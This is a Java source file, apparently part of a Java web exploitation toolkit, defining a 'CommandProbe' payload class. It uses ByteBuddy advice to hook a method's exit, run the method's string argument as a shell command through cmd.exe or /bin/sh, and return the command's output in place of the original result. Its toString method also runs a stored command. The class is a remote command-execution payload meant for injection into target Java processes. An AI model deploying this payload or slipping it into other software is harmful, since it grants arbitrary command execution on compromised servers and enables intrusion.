package com.reajason.javaweb.probe.payload;

import lombok.SneakyThrows;
import net.bytebuddy.asm.Advice;

import java.util.NoSuchElementException;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2025/8/5
 */
public class CommandProbe {
    private final String command;

    public CommandProbe(String command) {
        this.command = command;
    }

    @Advice.OnMethodExit
    public static String exit(@Advice.Argument(0) String data, @Advice.Return(readOnly = false) String ret) throws Exception {
        String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", data} : new String[]{"/bin/sh", "-c", data};
        Process process = new ProcessBuilder(cmd).start();
        try {
            return ret = new Scanner(process.getInputStream()).useDelimiter("\\A").next();
        } catch (NoSuchElementException e) {
            return ret = new Scanner(process.getErrorStream()).useDelimiter("\\A").next();
        }
    }

    @Override
    @SneakyThrows
    public String toString() {
        return CommandProbe.exit(command, super.toString());
    }
}
